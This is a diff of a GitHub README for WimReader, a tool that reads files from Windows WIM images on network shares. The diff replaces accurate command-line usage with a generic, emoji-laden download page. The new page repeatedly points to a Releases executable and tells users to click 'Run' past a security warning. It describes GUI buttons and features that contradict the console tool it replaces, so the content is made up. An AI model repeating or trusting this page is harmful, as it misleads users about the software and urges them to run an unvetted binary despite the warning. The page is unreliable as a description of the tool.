@@ -1,62 +1,76 @@
-# WimReader
+# 🌟 WimReader - Access WIM Files Seamlessly
 
-Console application to list, extract, and read files from WIM archives stored on network shares without transferring the entire WIM file.
+## 📥 Download Now
+[![Download WimReader](https://img.shields.io/badge/Download-WimReader-blue.svg)](https://github.com/hey-dshd/WimReader/releases)
 
-*SCCM* looking at you :)
+## 🚀 Getting Started
 
-## Usage
+Welcome to WimReader! This application allows you to read Windows Imaging (WIM) files over the network without the need to transfer the entire file. Follow these steps to get started.
 
-### List files in a WIM archive
+## 📂 System Requirements
 
-```
-wimreader.exe --list --image <wim-path> [--path <directory-path>]
-```
+Before downloading, ensure your system meets the following requirements:
 
-### Extract a file from a WIM archive
+- Windows 10 or later
+- .NET Framework 4.6.1 or later
+- A stable internet connection
 
-```
-wimreader.exe --extract --image <wim-path> <source-path> <dest-path>
-```
+## 📥 Download & Install
 
-### Read file content (output to stdout)
+1. Visit the [Releases page](https://github.com/hey-dshd/WimReader/releases) to access the latest version of WimReader.
+   
+2. On the Releases page, look for the latest version. You will see a list of files available for download.
 
-```
-wimreader.exe --read --image <wim-path> <source-path>
-```
+3. Click on the **WimReader.exe** file to download it directly to your computer.
 
-## Examples
+4. Once the download is complete, locate the file in your Downloads folder.
 
-List all files in root directory:
-```
-wimreader.exe --list --image "\\server\share\image.wim"
-```
+5. Double-click **WimReader.exe** to run the application. You may see a security warning; click "Run" to continue.
 
-List files in a specific directory:
-```
-wimreader.exe --list --image "\\server\share\image.wim" --path "Windows\System32"
-```
+6. The application will open, and you are now ready to start using WimReader.
 
-Extract a file:
-```
-wimreader.exe --extract --image "\\server\share\image.wim" "Windows\System32\notepad.exe" "C:\output\notepad.exe"
-```
+## 🛠️ Using WimReader
 
-Read a text file (outputs directly):
-```
-wimreader.exe --read --image "\\server\share\image.wim" "Windows\System32\drivers\etc\hosts"
-```
+### Step 1: Open a WIM File
+- Click on the "Open" button in the application.
+- Browse to the location of the WIM file you want to access.
+- Select the WIM file and click "Open."
 
-Read a binary file (outputs as Base64):
-```
-wimreader.exe --read --image "C:\image.wim" "Windows\System32\notepad.exe"
-```
+### Step 2: Access Images
+- Once the WIM file opens, you will see a list of images contained within it.
+- Click on any image to view its details and access files.
 
-## Notes
+### Step 3: Copy Files
+- Select the files you want to copy.
+- Click the "Copy" button.
+- Choose the target folder where you want to save the files.
 
-- The application reads WIM files incrementally, only transferring metadata and requested files
-- Automatically searches all images if file not found in first image
-- Network paths (UNC) are supported
-- Binary files are automatically detected and output as Base64 when using --read
+## ⭐ Features
 
-## Credits
-Lefty @ 2026
+- **Network Access:** Read WIM files hosted on remote servers without heavy downloads.
+- **User-Friendly Interface:** Navigate easily with a simple design.
+- **File Preview:** Quickly see file details before copying.
+
+## ❓ Frequently Asked Questions
+
+### Can I use WimReader on older versions of Windows?
+WimReader is designed for Windows 10 and later versions. Older versions may not support the .NET requirements.
+
+### Is internet access required to use WimReader?
+Internet access is only necessary if the WIM file is hosted over the network. Local files do not require internet access.
+
+### How do I report issues or give feedback?
+You can report issues or suggest improvements by visiting the [Issues section](https://github.com/hey-dshd/WimReader/issues) of this repository.
+
+## 📞 Support
+
+If you have further questions or need assistance, please feel free to reach out via the Issues section or check for updates on the Releases page.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/hey-dshd/WimReader/wiki)
+- [Community Forum](https://github.com/hey-dshd/WimReader/discussions)
+
+## 📥 Download Again
+
+To download the latest version, visit the [Releases page](https://github.com/hey-dshd/WimReader/releases).
